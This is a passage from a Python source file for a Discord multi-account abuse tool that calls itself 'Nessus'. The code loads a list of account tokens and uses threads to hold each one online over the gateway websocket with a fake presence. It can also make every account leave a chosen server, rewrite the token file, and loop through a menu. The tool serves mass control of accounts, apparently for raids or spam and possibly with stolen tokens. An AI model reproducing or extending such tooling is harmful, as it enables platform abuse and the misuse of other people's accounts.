                                             "name": config["name"],
                                             "type": 0,
                                             "details": config["details"],
                                             "state": config["state"],
                                         },
                                         "status": random.choice(self.statuses),
                                         "since": 0,
                                         "activities": [],
                                         "afk": False,
                                     },
                                 },
                                 "s": None,
                             "t": None,
                             }
                         )
                     )

                     print(f"{w}[{lb}ONLINER{w}] Now online")

                     while True:
                         heartbeatJSON = {
                             "op": 1, 
                             "token": self.token, 
                             "d": "null"
                         }
                         ws.send(json.dumps(heartbeatJSON))
                         time.sleep(heartbeat_interval)


             for token in open("input/tokens.txt", "r").read().splitlines():
                 threading.Thread(target=Onliner(token).__online__).start()
             time.sleep(1)
             print(f"{w}")
             SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
             os.system("pause >nul")
             return await menu()

        if choice == 15:
            Spinner()
            print("\n")
            open("input/tokens.txt", "w").write("")
            for token in tokens:
                token = changeFormat(token)
                open("input/tokens.txt", "a").write(token + "\n")
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()
            
        if choice == 3:
            Spinner()
            print("\n")
            guildId = input(
                f"{w}[{lb}>{w}] Server ID: ")
            async with TaskPool(10_000) as pool:
                for token in tokens:
                    await pool.put(leave(token, guildId))
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()

        if choice == 16:
            Spinner()
            print("\n")
            clearConsole()
            print(f"""

                                 {Fore.LIGHTMAGENTA_EX}   ▀█▄   ▀█▀                                       
                                 {Fore.LIGHTMAGENTA_EX}    █▀█   █    ▄▄▄▄   ▄▄▄▄ {Fore.LIGHTWHITE_EX}  ▄▄▄▄  ▄▄▄ ▄▄▄   ▄▄▄▄  
                                 {Fore.LIGHTMAGENTA_EX}    █ ▀█▄ █  ▄█▄▄▄██ ██▄ ▀ {Fore.LIGHTWHITE_EX} ██▄ ▀   ██  ██  ██▄ ▀  
                                 {Fore.LIGHTMAGENTA_EX}    █   ███  ██      ▄ ▀█▄▄{Fore.LIGHTWHITE_EX} ▄ ▀█▄▄  ██  ██  ▄ ▀█▄▄ 
                                 {Fore.LIGHTMAGENTA_EX}   ▄█▄   ▀█   ▀█▄▄▄▀ █▀▄▄█▀{Fore.LIGHTWHITE_EX} █▀▄▄█▀  ▀█▄▄▀█▄ █▀▄▄█▀

            """)
            SlowPrint(f"{w}[{lb}>{w}] Restarting Nessus!. . .")
            os.system("if not exist main.py exit")
            os.system("start main.py & exit")
            

        else:
            SlowPrint(f"{w}[{r}FAILURE{w}] Error occured! (Try again)")
            time.sleep(0.5)
            return await menu()
           
        
    except Exception as e:
        SlowPrint(f'{w}[{r}FAILURE{w}] Error occured! (Try again)')
        time.sleep(0.5)
        if Utility().config["traceback"]:
            print(format_exc())
            time.sleep(5)
        return await menu()

if __name__ == "__main__": 
    clearConsole()
    print(f"""

                                 {Fore.LIGHTMAGENTA_EX}   ▀█▄   ▀█▀                                       
                                 {Fore.LIGHTMAGENTA_EX}    █▀█   █    ▄▄▄▄   ▄▄▄▄ {Fore.LIGHTWHITE_EX}  ▄▄▄▄  ▄▄▄ ▄▄▄   ▄▄▄▄  
                                 {Fore.LIGHTMAGENTA_EX}    █ ▀█▄ █  ▄█▄▄▄██ ██▄ ▀ {Fore.LIGHTWHITE_EX} ██▄ ▀   ██  ██  ██▄ ▀  
                                 {Fore.LIGHTMAGENTA_EX}    █   ███  ██      ▄ ▀█▄▄{Fore.LIGHTWHITE_EX} ▄ ▀█▄▄  ██  ██  ▄ ▀█▄▄ 
                                 {Fore.LIGHTMAGENTA_EX}   ▄█▄   ▀█   ▀█▄▄▄▀ █▀▄▄█▀{Fore.LIGHTWHITE_EX} █▀▄▄█▀  ▀█▄▄▀█▄ █▀▄▄█▀

""")
    if len(open("input/tokens.txt").read().splitlines()) == 0:
        print(f"{w}[{r}FAILURE{w}] No tokens were detected! (Input tokens)")
        os.system("pause")
        exit()
    asyncio.run(menu())
